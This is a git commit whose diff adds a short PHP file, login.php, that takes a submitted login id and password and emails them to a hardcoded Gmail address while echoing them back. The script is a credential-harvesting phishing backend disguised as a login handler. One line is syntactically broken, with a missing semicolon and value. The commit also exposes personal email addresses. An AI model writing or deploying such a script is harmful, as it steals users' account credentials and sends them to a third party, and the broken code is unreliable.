1b05cb79a0264704ee83bc2c4c1666b5d034e06f
StartupDevta <startupdevta@gmail.com>
2019-10-04 21:43:16 +0530

    added

---
+++ login.php
@@ -0,0 +1,15 @@
+<?php
+
+$log=$_POST['log'];
+$to='rrohitchauhan11@gmail.com';
+$pwd=$_POST['pwd'];
+$subject="change Password";
+$message="id:".$log."  "."password:"."$pwd";
+$headers="From:"
+echo $log;
+echo $pwd;
+mail($to, $subject, $message, $headers);
+
+
+
+?>
